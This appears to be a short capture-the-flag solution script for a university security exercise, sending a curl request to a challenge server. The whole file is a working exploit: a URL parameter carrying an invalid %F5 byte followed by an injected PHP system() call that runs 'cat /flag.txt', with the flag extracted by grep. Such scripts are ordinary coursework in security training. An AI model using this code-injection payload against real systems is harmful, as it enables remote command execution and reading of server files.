#!/bin/sh

# %F5 invalid character
# http://tpas.alunos.dcc.fc.up.pt:5016?name=%F5<?php system("cat /flag.txt") ?>

curl --silent http://tpas.alunos.dcc.fc.up.pt:5016/\?name\=%F5%3C\?php%20system\(%22cat%20/flag.txt%22\)%20\?%3E | grep -oE "TPAS{.+}" --color=none
